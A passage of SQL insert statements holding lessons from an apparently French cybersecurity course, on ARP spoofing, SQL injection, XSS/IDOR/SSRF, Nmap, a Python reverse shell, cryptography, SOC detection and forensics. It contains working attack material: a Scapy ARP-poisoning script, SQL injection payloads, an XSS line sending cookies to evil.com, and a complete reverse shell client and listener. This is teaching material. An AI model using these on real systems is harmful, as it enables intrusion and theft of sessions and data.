[ Victime (192.168.1.50) ] --------------------> [ Passerelle / Box (192.168.1.1) ]
     MAC: AA:AA:AA:AA:AA:AA                             MAC: GG:GG:GG:GG:GG:GG

------------------------------------------------------------------------------------

        PENDANT L''ATTAQUE (Empoisonnement Bilatéral) :
[ Victime (192.168.1.50) ]                      [ Passerelle / Box (192.168.1.1) ]
  Table ARP Victime :                             Table ARP Passerelle :
  192.168.1.1 -> EE:EE:EE:EE:EE:EE                192.168.1.50 -> EE:EE:EE:EE:EE:EE
              \                                        /
               \                                      /
                v                                     v
                 [ ATTAQUANT KALI (192.168.1.100) ]
                     MAC: EE:EE:EE:EE:EE:EE
                   (sysctl net.ipv4.ip_forward = 1)
```

1. L''attaquant envoie en boucle des paquets ARP falsifiés à la Victime : *« L''adresse IP 192.168.1.1 (la passerelle) est à mon adresse MAC EE:EE... »*.
2. L''attaquant envoie en boucle des paquets ARP falsifiés à la Passerelle : *« L''adresse IP 192.168.1.50 (la victime) est à mon adresse MAC EE:EE... »*.
3. L''attaquant active le transfert de paquets sur son noyau Linux :
   ```bash
   sudo sysctl -w net.ipv4.ip_forward=1
   ```
   Désormais, tout le trafic Web, DNS ou VoIP de la victime transite par la machine de l''attaquant avant d''être retransmis vers Internet sans interruption de service !

---

## 3. Implémentation du Script Python d''Audit ARP avec Scapy

```python
from scapy.all import ARP, send, getmacbyip
import time
import sys

def forger_reponse_arp(ip_cible: str, ip_usurpee: str):
    """
    Envoie un paquet ARP op=2 (''is-at'') associant l''IP usurpée à notre propre MAC.
    """
    mac_cible = getmacbyip(ip_cible)
    if not mac_cible:
        print(f"[!] Impossible de résoudre l''adresse MAC pour l''IP : {ip_cible}")
        return False
        
    paquet = ARP(
        op=2,                 # Réponse ARP
        pdst=ip_cible,        # IP de la machine à tromper
        hwdst=mac_cible,      # MAC physique de la cible
        psrc=ip_usurpee       # IP dont on s''attribue l''identité
    )
    send(paquet, verbose=False)
    return True

def restaurer_tables(ip_cible: str, ip_source: str):
    """Restaure l''état d''origine des tables ARP en envoyant les vraies adresses MAC."""
    mac_cible = getmacbyip(ip_cible)
    mac_source = getmacbyip(ip_source)
    paquet = ARP(op=2, pdst=ip_cible, hwdst=mac_cible, psrc=ip_source, hwsrc=mac_source)
    send(paquet, count=5, verbose=False)
    print(f"[*] Tables ARP saines restaurées entre {ip_cible} et {ip_source}.")
```

---

## 4. Contre-Mesures & Défense en Entreprise

1. **Dynamic ARP Inspection (DAI) :** Fonctionnalité des commutateurs managés (Cisco, Juniper) qui inspecte chaque paquet ARP transitant sur les ports et compare l''association IP/MAC avec la base de données de confiance DHCP Snooping. Toute fausse réponse est instantanément rejetée au niveau du matériel !
2. **Tables ARP Statiques (`arp -s`) :** Définir de manière immuable l''adresse MAC de la passerelle par défaut sur les serveurs critiques pour empêcher toute modification dynamique.
3. **Détection SOC :** Un système de détection d''intrusions (ex: `arpwatch`, Snort, Suricata) lève une alerte immédiate lorsqu''il observe un conflit : deux adresses IP différentes revendiquant la même adresse MAC.
','article',2,55,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol6_sqli','m_vol6_2','lab-05-mecanismes-injection-sql-requetes-preparees','LAB 05 : Anatomie des Injections SQL & Requêtes Préparées','Comprendre et reproduire les différentes familles d''injections SQL (In-Band UNION, Error-Based, Blind Boolean/Time) et implémenter la remédiation par requêtes paramétrées.','# LAB 05 : Anatomie des Injections SQL & Requêtes Préparées

L''**Injection SQL (SQL Injection - SQLi)** figure depuis plus de 20 ans parmi les vulnérabilités les plus dévastatrices répertoriées par l''OWASP (Catégorie A03:2021 - Injection). Elle permet à un attaquant de briser le contexte de données pour injecter des commandes SQL directement interprétées par le moteur de base de données.

---

## 1. La Cause Première : La Concaténation Naïve de Chaînes

L''erreur fondamentale réside dans l''assemblage dynamique d''une requête SQL par simple concaténation de texte avec des entrées fournies par l''utilisateur :

```python
# ❌ CODE CRITIQUEMENT VULNÉRABLE :
def authentifier_utilisateur_vulnerable(username_input: str, password_input: str):
    # L''entrée utilisateur est directement collée dans la chaîne SQL !
    requete = f"SELECT id, role FROM users WHERE username = ''{username_input}'' AND password = ''{password_input}''"
    return db.execute(requete)
```

Si un attaquant saisit dans le champ utilisateur :
```sql
admin'' --
```
La requête exécutée par la base de données devient :
```sql
SELECT id, role FROM users WHERE username = ''admin'' --'' AND password = ''...''
```
Les caractères `--` (ou `#` sous MySQL) indiquent un commentaire SQL. Toute la clause de vérification du mot de passe est purement et simplement ignorée ! L''attaquant se connecte instantanément en tant qu''administrateur sans connaître le mot de passe.

---

## 2. Les Différentes Familles d''Injections SQL

```
                       [ INJECTIONS SQL ]
                        /       |        \
                       /        |         \
         [ IN-BAND ]      [ INFERENTIAL ]   [ OUT-OF-BAND ]
          /       \          (BLIND)          (DNS / HTTP)
    UNION-Based  Error-Based   /        \
                        Boolean-Based  Time-Based
```

### A. L''Injection In-Band UNION (`UNION SELECT`)
Permet de joindre le résultat de la requête légitime avec les tables confidentielles du système :
```sql
'' UNION SELECT null, username, password, email FROM users--
```

### B. L''Injection Blind Temporelle (Time-Based Blind)
Lorsque l''application n''affiche aucun message d''erreur ni aucune donnée à l''écran, l''attaquant force la base de données à marquer une pause temporelle pour déduire les données caractère par caractère :
```sql
'' OR (SELECT CASE WHEN (SUBSTR(password,1,1)=''a'') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username=''admin'')--
```
Si la page met 5 secondes à répondre, le premier caractère du mot de passe de l''administrateur est validé comme étant la lettre ''a'' !

---

## 3. Le Remède Définitif : Les Requêtes Préparées (Paramétrage)

La seule méthode de remédiation infaillible et pérenne est l''utilisation stricte de **Requêtes Préparées avec Paramètres Liés (Prepared Statements / Parameterized Queries)** :

```python
# ✅ CODE TOTALEMENT SÉCURISÉ :
def authentifier_utilisateur_securise(username_input: str, password_input: str):
    # La requête est pré-compilée par le SGBD avec des marqueurs de position ''?''
    sql = "SELECT id, password_hash, role FROM users WHERE username = ?"
    curseur = db.cursor()
    
    # La valeur est transmise séparément dans le tuple de paramètres
    curseur.execute(sql, (username_input,))
    user = curseur.fetchone()
    
    if not user:
        return None
        
    # Vérification sécurisée du mot de passe avec sel cryptographique
    import hashlib, secrets
    if secrets.compare_digest(hashlib.sha256(password_input.encode()).hexdigest(), user["password_hash"]):
        return user
    return None
```

Dans une requête préparée, le moteur SQL compile la syntaxe de la requête **avant** de recevoir les données. Même si l''entrée utilisateur contient des guillemets, des apostrophes ou `UNION SELECT`, le moteur SQL traite l''intégralité de l''entrée comme une valeur littérale (donnée pure) et non comme du code exécutable. L''injection est mathématiquement impossible.
','lab',1,55,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol7_owasp','m_vol7_1','owasp-top-10-xss-csrf-idor-ssrf-remediation','OWASP Top 10 : XSS, CSRF, IDOR & SSRF en Pratique','Étude approfondie des vulnérabilités applicatives web majeures : Cross-Site Scripting (Reflected, Stored, DOM), CSRF, failles de contrôle d''accès IDOR et Server-Side Request Forgery.','# OWASP Top 10 : Vulnérabilités Web Majeures & Remédiations

Le projet **OWASP (Open Web Application Security Project)** publie régulièrement son classement des 10 risques de sécurité les plus critiques pour les applications Web. En tant que futur auditeur ou développeur sécurisé, la maîtrise de ces failles et de leurs mécanismes de défense est essentielle.

---

## 1. Cross-Site Scripting (XSS)

Le XSS consiste à injecter du code JavaScript malveillant dans une page web légitime consultée par d''autres utilisateurs. Le script s''exécute dans le contexte de sécurité du navigateur de la victime.

```
[ ATTAQUANT ]
     |
     v 1. Injection d''un payload : <script>document.location=''http://evil.com/?c=''+document.cookie</script>
[ SERVEUR WEB NON SÉCURISÉ ]
     |
     v 2. Rendu de la page HTML non assainie contenant le script malveillant
[ VICTIME LÉGITIME (Navigateur) ]
     |  -> Exécution du JavaScript dans le contexte d''origine de l''application
     v 3. Vol du cookie de session sensible
[ SERVEUR DE L''ATTAQUANT (evil.com) ]
```

### Les Trois Types de XSS :
1. **XSS Stocké (Stored / Persistent) :** Le payload est enregistré de manière permanente en base de données (ex: dans un commentaire de forum ou un profil utilisateur) et s''exécute chaque fois qu''un internaute affiche la page. C''est la forme la plus dangereuse.
2. **XSS Réfléchi (Reflected) :** Le payload provient de l''URL ou d''un paramètre GET (`?search=<script>...`) et est immédiatement répercuté dans la réponse HTML du serveur.
3. **XSS basé sur le DOM (DOM-based) :** La vulnérabilité réside entièrement dans le code JavaScript côté client qui manipule dangereusement le DOM (ex: utilisation de `innerHTML` ou `eval()` avec `window.location.hash`).

### Défense Contre le XSS :
* **Échappement contextuel (Context-aware Encoding) :** Encoder systématiquement les caractères réservés (`<` devient `&lt;`, `>` devient `&gt;`, `"` devient `&quot;`).
* **Politique de Sécurité du Contenu (Content Security Policy - CSP) :**
  ```http
  Content-Security-Policy: default-src ''self''; script-src ''self'' https://trustedscripts.com;
  ```
* **Flag HttpOnly sur les Cookies :** Interdit strictement à tout code JavaScript d''accéder au cookie d''authentification (`document.cookie`).

---

## 2. Insecure Direct Object References (IDOR / BOLA)

Une faille IDOR (ou *Broken Object-Level Authorization*) survient lorsqu''une application utilise un identifiant direct fourni par l''utilisateur pour accéder à une ressource sans vérifier que l''utilisateur en est bien le propriétaire légitime :

```http
# Requête légitime de l''utilisateur Alice (ID 42) :
GET /api/documents/invoice_42.pdf HTTP/1.1
Authorization: Bearer <Token_Alice>

# Attaque IDOR : Alice modifie simplement le numéro dans l''URL :
GET /api/documents/invoice_43.pdf HTTP/1.1
Authorization: Bearer <Token_Alice>
```
Si le serveur renvoie la facture de Bob (ID 43) sans vérifier la concordance entre le jeton de session d''Alice et la ressource 43, l''IDOR est confirmée !

### Remédiation IDOR :
Ne vous fiez jamais à l''identifiant transmis par l''URL. Associez toujours l''identifiant du compte connecté extrait du jeton de session validé :
```python
# Requête sécurisée avec contrôle d''autorisation au niveau de l''objet :
document = db.query("SELECT * FROM invoices WHERE id = ? AND owner_user_id = ?", (invoice_id, current_user.id))
if not document:
    raise HTTPException(status_code=403, detail="Accès non autorisé à cette ressource.")
```

---

## 3. Server-Side Request Forgery (SSRF)

Dans une faille SSRF, l''attaquant force le serveur web backend à émettre une requête réseau HTTP vers une destination interne normalement inaccessible depuis l''extérieur (ex: l''API de métadonnées AWS à l''adresse `http://169.254.169.254/latest/meta-data/` ou des microservices internes non authentifiés).

### Remédiation SSRF :
Valider les URLs fournies par une liste blanche stricte (Whitelisting), interdire les résolutions d''adresses IP privées (RFC 1918 : `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) et les adresses de lien local (`169.254.0.0/16`).
','article',1,50,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol8_nmap','m_vol8_1','reconnaissance-reseau-avancee-nmap-scripts-nse','Reconnaissance Réseau Avancée avec Nmap & Scripts NSE','Cartographie complète de la surface d''attaque avec Nmap : scans furtifs SYN (-sS), prise d''empreinte de services (-sV), détection d''OS (-O) et scripts d''audit automatisés NSE.','# Reconnaissance Réseau avec Nmap & le Moteur de Scripts NSE

Considéré comme le standard absolu de la cartographie réseau depuis plus de 25 ans, **Nmap (Network Mapper)** est le premier outil dégainé lors d''un test d''intrusion ou d''un audit de conformité d''infrastructure.

---

## 1. Les Modes de Scan Majeurs de Nmap

```
+------------------+---------------------+---------------------------------------------------+
| COMMANDE         | TYPE DE SCAN        | MÉCANISME TECHNIQUE & DISCRÉTION                  |
+------------------+---------------------+---------------------------------------------------+
| nmap -sS <cible> | SYN Stealth Scan    | Envoie un SYN. Si SYN-ACK reçu, répond par un RST |
|                  | (Scan par défaut)   | pour ne jamais achever la poignée de main TCP !   |
+------------------+---------------------+---------------------------------------------------+
| nmap -sT <cible> | Connect Scan        | Établit une connexion TCP complète (connect()).   |
|                  |                     | Laisse des traces massives dans les journaux OS.  |
+------------------+---------------------+---------------------------------------------------+
| nmap -sU <cible> | UDP Scan            | Teste les ports UDP (DNS, SNMP, DHCP). Plus lent  |
|                  |                     | car attend les messages ICMP Port Unreachable.    |
+------------------+---------------------+---------------------------------------------------+
| nmap -sV <cible> | Version Detection   | Interroge les ports ouverts avec des sondes pour  |
|                  |                     | extraire la bannière et version exacte du service.|
+------------------+---------------------+---------------------------------------------------+
| nmap -p- <cible> | Full Port Scan      | Balaye l''intégralité des 65 535 ports TCP.        |
+------------------+---------------------+---------------------------------------------------+
```

---

## 2. La Commande d''Audit Recommandée en Pentest Réel

Pour auditer une cible dans le cadre d''un engagement professionnel, voici la syntaxe de référence combinant rapidité et richesse d''information :

```bash
sudo nmap -sS -sV -sC -O -T4 -p- -oA audit_cible_192.168.1.50 192.168.1.50
```

### Décomposition des arguments :
* **`-sS` :** Balayage SYN furtif (requiert les privilèges root sous Linux).
* **`-sV` :** Détection de version des logiciels serveurs (ex: `Apache 2.4.52`, `OpenSSH 8.9p1`).
* **`-sC` :** Exécution des scripts de détection par défaut du Nmap Scripting Engine (NSE).
* **`-O` :** Détection de l''empreinte du système d''exploitation par analyse de la pile TCP/IP.
* **`-T4` :** Profil temporel agressif (recommandé sur les réseaux locaux et fibre).
* **`-p-` :** Scanne **tous** les ports de 1 à 65535 (évite de passer à côté d''un port non standard comme un proxy sur 9000 ou 4444).
* **`-oA <nom>` :** Exporte les résultats sous les trois formats indispensables en simultané : texte brut (`.nmap`), grepable (`.gnmap`) et XML (`.xml`) pour importation dans les outils de reporting.

---

## 3. Le Moteur de Scripts NSE (Nmap Scripting Engine)

Écrits en langage **Lua**, les scripts NSE étendent les capacités de Nmap pour automatiser des tâches d''évaluation de vulnérabilités :

```bash
# Vérifier si une cible est vulnérable à la faille critique SMB EternalBlue (MS17-010)
nmap -p 445 --script smb-vuln-ms17-010 192.168.1.50

# Lister les certificats TLS et tester les chiffrements dépréciés (SSLv3, TLS 1.0)
nmap -p 443 --script ssl-enum-ciphers 192.168.1.50

# Énumérer les partages NFS ouverts sur le réseau
nmap -p 111,2049 --script nfs-showmount 192.168.1.50
```
','article',1,45,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol9_sockets','m_vol9_1','architecture-reverse-shell-sockets-python-subprocess','Développement d''un Reverse Shell en Sockets Purs (Python)','Architecture client/serveur d''un Reverse Shell robuste : sockets TCP natifs (AF_INET, SOCK_STREAM), redirection des flux d''exécution via subprocess et navigation de répertoires.','# Architecture d''un Reverse Shell en Python Pur (Sockets & Subprocess)

Issu des **Chapitres 6 et 7 de Python Hacking Éthique**, ce cours expose la mécanique fondamentale des chevaux de Troie d''accès distant (**Remote Access Trojans - RAT**) et des **Reverse Shells**.

---

## 1. Bind Shell vs Reverse Shell : Pourquoi le Reverse Shell ?

* **Bind Shell (Connexion Entrante) :** La machine compromise ouvre un port d''écoute (ex: port 4444). L''attaquant doit s''y connecter directement.
  * *Problème :* Dans 99% des cas, le routeur NAT et le pare-feu du réseau de l''entreprise bloquent toutes les connexions entrantes directes.
* **Reverse Shell (Connexion Sortante) :** L''attaquant configure un serveur d''écoute sur sa propre machine publique. C''est la machine compromise qui initie la connexion sortante vers l''attaquant (souvent sur le port 443 ou 80).
  * *Avantage tactique :* Les pare-feux autorisent généralement le trafic sortant vers les ports Web usuels. Le NAT est automatiquement traversé !

```
[ POSTE VICTIME COMPROMIS ]                   [ SERVEUR DE CONTRÔLE KALI ]
(Derrière un pare-feu NAT strict)                 (IP Publique ou Port Forwardé)
             |                                                  |
             | === 1. Connexion TCP sortante (Port 443) ======> | (En écoute : socket.bind)
             |                                                  |
             | <== 2. Envoi d''une commande shell ("whoami") === |
             |                                                  |
  Exécution locale :                                            |
  subprocess.check_output()                                     |
             |                                                  |
             | === 3. Renvoi de la sortie ("nt authority\system") =>|
```

---

## 2. Le Serveur d''Écoute de l''Auditeur (`serveur_c2.py`)

Ce script s''exécute sur la machine de l''auditeur. Il attend la connexion entrante du poste cible et fournit un prompt de commande interactif :

```python
import socket

def lancer_serveur_ecoute(hote: str = "0.0.0.0", port: int = 4444):
    serveur = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Permet de réutiliser immédiatement l''adresse après fermeture
    serveur.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    serveur.bind((hote, port))
    serveur.listen(1)
    print(f"[*] Serveur d''écoute RayLab en attente sur {hote}:{port}...")
    
    connexion, adresse_client = serveur.accept()
    print(f"[+] Connexion reçue avec succès depuis : {adresse_client[0]}:{adresse_client[1]}")
    
    with connexion:
        while True:
            commande = input("RayLab-Shell> ")
            if not commande.strip():
                continue
            
            # Envoi de la commande encodée en octets
            connexion.sendall(commande.encode("utf-8"))
            
            if commande.strip().lower() == "exit":
                print("[*] Fermeture de la session.")
                break
                
            # Réception du résultat de la commande
            reponse = connexion.recv(8192).decode("utf-8", errors="replace")
            print(reponse)

if __name__ == "__main__":
    lancer_serveur_ecoute()
```

---

## 3. Le Client Reverse Shell sur le Poste Cible (`client_agent.py`)

Ce script s''exécute sur la machine auditée. Il se connecte au serveur et exécute les commandes transmises à l''aide de `subprocess` et `os` :

```python
import socket
import subprocess
import os

IP_SERVEUR = "192.168.1.100"  # Adresse de la machine attaquante
PORT_SERVEUR = 4444

def demarrer_agent():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((IP_SERVEUR, PORT_SERVEUR))
    except Exception as e:
        return # Échec de connexion silencieux
        
    while True:
        try:
            commande = client.recv(4096).decode("utf-8")
            if not commande or commande.strip().lower() == "exit":
                break
                
            # Gestion spéciale du changement de répertoire (cd)
            if commande.startswith("cd "):
                dossier = commande[3:].strip()
                try:
                    os.chdir(dossier)
                    resultat = f"[+] Répertoire courant modifié : {os.getcwd()}\n"
                except Exception as err:
                    resultat = f"[-] Erreur de navigation : {err}\n"
            else:
                # Exécution sécurisée avec capture conjointe de stdout et stderr
                resultat = subprocess.check_output(
                    commande,
                    shell=True,
                    stderr=subprocess.STDOUT
                ).decode("utf-8", errors="replace")
                
            client.sendall(resultat.encode("utf-8"))
        except Exception as e:
            client.sendall(f"[-] Erreur d''exécution : {e}\n".encode("utf-8"))
            
    client.close()

if __name__ == "__main__":
    demarrer_agent()
```

> [!CAUTION]
> Ce code est fourni à des fins strictement éducatives et pédagogiques dans le cadre de cours d''ingénierie logicielle et d''audit autorisé. Tout déploiement non autorisé sur un système tiers constitue une infraction pénale passible des peines prévues par l''article 323-1 du Code pénal.
','article',1,55,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol10_crypto','m_vol10_1','cryptographie-symetrique-aes-gcm-asymetrique-rsa-tls','Cryptographie Symétrique (AES-GCM), Asymétrique (RSA) & TLS','Maîtriser les fondements cryptographiques modernes : chiffrement de bloc authentifié AES-256-GCM, cryptographie asymétrique RSA-4096 / ECC et négociation TLS 1.3.','# Cryptographie Moderne : AES-256-GCM, RSA & Protocole TLS 1.3

La cryptographie est la science mathématique permettant de protéger la confidentialité et l''intégrité de l''information. En ingénierie logicielle comme en cybersécurité, comprendre la différence fondamentale entre chiffrement symétrique et asymétrique évite les erreurs de conception critiques.

---

## 1. Chiffrement Symétrique Authentifié (AES-GCM)

Dans le chiffrement symétrique, une **seule et même clé secrète** est partagée entre l''émetteur et le récepteur pour chiffrer et déchiffrer.

* **AES (Advanced Encryption Standard - FIPS 197) :** Chiffre des blocs de 128 bits avec une clé de 128, 192 ou 256 bits.
* **Le Mode GCM (Galois/Counter Mode) :** Fournit un chiffrement authentifié avec données associées (**AEAD**). En plus de chiffrer le message, il génère un tag d''authentification cryptographique de 128 bits. Si un attaquant modifie un seul bit du message chiffré en transit, le déchiffrement échoue immédiatement !

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import os

def demonstrer_aes_gcm():
    # Génération d''une clé AES 256 bits hautement aléatoire (CSPRNG)
    cle = AESGCM.generate_key(bit_length=256)
    aesgcm = AESGCM(cle)
    
    # Vecteur d''initialisation (Nonce) unique de 96 bits (12 octets)
    nonce = os.urandom(12)
    message_clair = b"Donnees ultra-confidentielles du serveur RayLab"
    
    # Chiffrement authentifié
    chiffre_avec_tag = aesgcm.encrypt(nonce, message_clair, associated_data=None)
    print(f"[*] Message chiffré ({len(chiffre_avec_tag)} octets) : {chiffre_avec_tag.hex()[:32]}...")
    
    # Déchiffrement et validation d''intégrité
    message_recupere = aesgcm.decrypt(nonce, chiffre_avec_tag, associated_data=None)
    print(f"[✓] Message restauré avec succès : {message_recupere.decode()}")

demonstrer_aes_gcm()
```

> [!WARNING]
> En mode AES-GCM, **ne réutilisez JAMAIS le même couple (clé, nonce)** ! La réutilisation d''un nonce avec la même clé permet à un attaquant d''extraire la clé d''authentification par simple opération mathématique XOR.

---

## 2. Chiffrement Asymétrique & Signature (RSA & ECC)

Le chiffrement asymétrique utilise une **paire de clés mathématiquement liées** :
* **Clé publique :** Diffusée librement à tout le monde.
* **Clé privée :** Conservée jalousement et secrètement par son propriétaire.

### Les Deux Grands Usages :
1. **Confidentialité (Chiffrement) :** Alice chiffre avec la clé publique de Bob. Seul Bob peut déchiffrer avec sa clé privée.
2. **Authenticité & Non-répudiation (Signature) :** Alice signe l''empreinte d''un document avec sa clé privée. Tout le monde peut vérifier la signature avec la clé publique d''Alice.

---

## 3. Le Chiffrement Hybride & TLS 1.3

Le chiffrement asymétrique (RSA/ECC) est très coûteux en calcul CPU (environ 1 000 fois plus lent qu''AES). Par conséquent, les protocoles modernes comme **TLS 1.3 (HTTPS)** utilisent le **Chiffrement Hybride** :
1. Les deux parties négocient une clé de session symétrique éphémère grâce à un échange de clés asymétrique (Diffie-Hellman à courbes elliptiques - ECDHE).
2. Tout le flux de données HTTP est ensuite chiffré ultra-rapidement avec cette clé symétrique en AES-256-GCM ou ChaCha20-Poly1305.
','article',1,50,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol11_soc','m_vol11_2','surveillance-soc-analyse-logs-siem-regles-sigma-fim','Surveillance SOC : Analyse de Logs, SIEM, Règles Sigma & FIM','Architecture opérationnelle d''un Security Operations Center (SOC) : collecte Syslog/EVTX, corrélation SIEM, détection d''anomalies, règles Sigma et moniteur d''intégrité de fichiers FIM.','# Opérations Blue Team : Surveillance SOC, SIEM & Règles Sigma

Dans une organisation moderne, la **Blue Team** assure la défense en continu des systèmes. Le centre névralgique de cette mission est le **SOC (Security Operations Center)**, appuyé par un **SIEM (Security Information and Event Management)** qui centralise, normalise et corrèle des millions d''événements réseau et système par seconde.

---

## 1. La Pyramide de Détection du SOC

```
               [ ALERTES PRIORITAIRES (L3 / Incident Response) ]
                                   /    \
                                  /      \
                  [ RÈGLES DE CORRÉLATION SIEM (L2 / Threat Hunting) ]
                                /          \
                               /            \
            [ FILTRAGE & TRIAGE DES ÉVÉNEMENTS (L1 / Automatisation) ]
                            /                    \
                           /                      \
[ LOGS BRUTS : Firewalls, Syslog Linux, Windows EVTX, EDR, Cloudtrail, DNS, Web Nginx ]
```

### Les Niveaux d''Analyse au sein d''un SOC :
* **Niveau 1 (Triage & Qualification) :** Surveillance de la console d''alertes en temps réel, qualification des faux positifs, escalade vers le N2.
* **Niveau 2 (Investigation Approfondie) :** Corrélation des sources, extraction d''artéfacts (IoC - *Indicators of Compromise*), écriture de nouvelles règles de détection.
* **Niveau 3 (Chasse aux Menaces & Incident Response) :** Threat Hunting proactif, analyse de malwares et pilotage de crise lors d''une cyberattaque avérée.

---

## 2. Le Standard des Règles Sigma pour la Détection

Tout comme les règles **Yara** standardisent la détection de fichiers malveillants, les règles **Sigma** constituent le standard ouvert et universel pour décrire des requêtes de détection de comportements suspects sur les flux de journaux (indépendamment du SIEM utilisé : Splunk, Elastic, QRadar ou Microsoft Sentinel) :

```yaml
title: Détection d''Attaque par Empoisonnement ARP
id: 5b4c102b-9273-455b-a621-raylab001
status: production
description: Détecte les messages de conflit d''adresses MAC signalant une attaque MITM sur le réseau local.
references:
    - https://raylab.tech/cyberpath
author: RayLab Blue Team Academy
logsource:
    category: network_security
    product: linux
    service: syslog
detection:
    selection:
        message|contains:
            - "mac address changed"
            - "duplicate IP address"
            - "kernel: arp: table full"
    condition: selection
level: high
tags:
    - attack.credential_access
    - attack.t1557.002 # MITRE ATT&CK : Adversary-in-the-Middle ARP Cache Poisoning
```

---

## 3. Le Moniteur d''Intégrité de Fichiers (File Integrity Monitoring - FIM)

Un composant clé de la défense d''hôte (HIDS) consiste à surveiller l''intégrité cryptographique des fichiers critiques du système d''exploitation.

```python
import hashlib
from pathlib import Path

def generer_base_de_reference(dossier: Path) -> dict[str, str]:
    """Calcule et enregistre la signature SHA-256 de chaque fichier d''un dossier sensible."""
    base = {}
    for fichier in dossier.rglob("*"):
        if fichier.is_file():
            hasher = hashlib.sha256()
            with open(fichier, "rb") as f:
                while chunk := f.read(65536):
                    hasher.update(chunk)
            base[str(fichier)] = hasher.hexdigest()
    return base

def auditer_integrite(base_reference: dict[str, str]) -> list[str]:
    """Compare l''état actuel avec la base de référence pour lever une alerte immédiate."""
    anomalies = []
    for chemin_str, hash_attendu in base_reference.items():
        p = Path(chemin_str)
        if not p.exists():
            anomalies.append(f"[FICHIER SUPPRIMÉ] : {chemin_str}")
            continue
        hasher = hashlib.sha256()
        with open(p, "rb") as f:
            while chunk := f.read(65536):
                hasher.update(chunk)
        if hasher.hexdigest() != hash_attendu:
            anomalies.append(f"[FICHIER ALTÉRÉ] : {chemin_str} (Hash modifié !)")
    return anomalies
```
','article',1,55,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol12_forensics','m_vol12_1','lab-10-digital-forensics-chaine-custody-analyse-ram-timeline','LAB 10 : Digital Forensics — Chaîne de Custody & Analyse de RAM','Méthodologie de la criminalistique numérique (DFIR) selon la RFC 3227 : ordre de volatilité, extraction d''artéfacts de mémoire vive (Volatility) et reconstruction de timeline d''attaque.','# LAB 10 : Digital Forensics — Préservation de Preuves & Analyse Mémoire

La criminalistique numérique (**Digital Forensics & Incident Response - DFIR**) intervient lorsqu''un incident de sécurité s''est produit. Son but est de répondre méthodiquement aux cinq questions fondamentales : **Qui ? Quoi ? Quand ? Où ? Comment ?**, tout en garantissant la recevabilité des preuves devant une juridiction légale.

---

## 1. L''Ordre de Volatilité des Preuves (RFC 3227)

Toute intervention sur une machine compromise doit respecter strictement l''ordre de volatilité : les données disparaissant le plus vite doivent être collectées en priorité absolue avant d''éteindre ou de modifier le système !

```
+--------------------------------------------------------------------------+
| 1. Registres processeur & Cache CPU (Extrêmement volatil : nanosecondes) |
+--------------------------------------------------------------------------+
| 2. Mémoire vive (RAM) : Connexions réseau actives, clés cryptographiques, |
|    processus en mémoire, mots de passe déchiffrés (Minutes)              |
+--------------------------------------------------------------------------+
| 3. État du réseau : Tables de routage, connexions ouvertes (netstat, arp)|
+--------------------------------------------------------------------------+
| 4. Système de fichiers temporaires (/tmp, fichiers swap, pagefile.sys)   |
+--------------------------------------------------------------------------+
| 5. Disques durs physiques et partitions de stockage persistant           |
+--------------------------------------------------------------------------+
| 6. Journaux distants (SIEM, Syslog centralisé) et sauvegardes d''archives |
+--------------------------------------------------------------------------+
```

> [!CAUTION]
> N''éteignez JAMAIS brutalement un serveur compromis ! En débranchant la prise électrique, vous détruisez irrémédiablement le contenu de la mémoire vive (RAM) qui contenait la clé de déchiffrement du malware ou l''adresse IP de commande et contrôle (C2) de l''intrus.

---

## 2. La Chaîne de Traçabilité (Chain of Custody)

Pour qu''un artéfact numérique soit recevable juridiquement, l''enquêteur doit prouver qu''il n''a subi aucune altération :
1. **Acquisition en lecture seule (Write-Blocker) :** L''image disque ou mémoire est réalisée à l''aide d''un bloqueur d''écriture matériel ou logiciel.
2. **Calcul d''empreinte immédiat :** Dès la fin de la capture, l''empreinte SHA-256 de l''image est calculée et consignée sur un registre d''audit physique et numérique.
3. **Travail exclusif sur copie :** L''analyste forensique ne travaille **jamais** sur la preuve originale, mais toujours sur une copie bit-à-bit vérifiée par hash.

---

## 3. Analyse de Mémoire Volatile avec Volatility 3

**Volatility 3** est le framework de référence pour inspecter les images de mémoire RAM (`memdump.raw`) :

```bash
# 1. Lister les processus qui tournaient en mémoire lors de l''incident
python3 vol.py -f memdump.raw windows.pslist

# 2. Détecter les processus cachés par un rootkit (analyse croisée EPROCESS)
python3 vol.py -f memdump.raw windows.psscan

# 3. Lister les connexions réseau actives (IPs distantes, sockets)
python3 vol.py -f memdump.raw windows.netscan

# 4. Extraire un binaire suspect de la mémoire pour rétro-ingénierie
python3 vol.py -f memdump.raw windows.dumpfiles --pid 1337
```
','lab',1,55,'published',1,NULL,'2026-11-04T20:51:45.837Z','2026-11-04T20:51:45.837Z');
INSERT INTO "lessons" VALUES('les_cp_vol12_capstone','m_vol12_2','capstone-final-cyberpath-scenario-evaluation-integrale','Le Capstone Final CyberPath 2026-2027 : Évaluation Opérationnelle','Mise en situation complète intégrant les 12 volumes : audit d''infrastructure hybride, exploitation éthique contrôlée, remédiation de code et soutenance professionnelle.','# Le Capstone Final CyberPath 2026-2027 : Épreuve de Synthèse

Félicitations pour votre progression à travers l''ensemble des volumes de **CyberPath 2026-2027** et du **Manuel Complet de Python**. Le Capstone Project constitue l''épreuve d''ingénierie intégrale qui valide votre transition de débutant à spécialiste opérationnel crédible sur le marché du travail.

---

## 1. Scénario Opérationnel de l''Épreuve Capstone

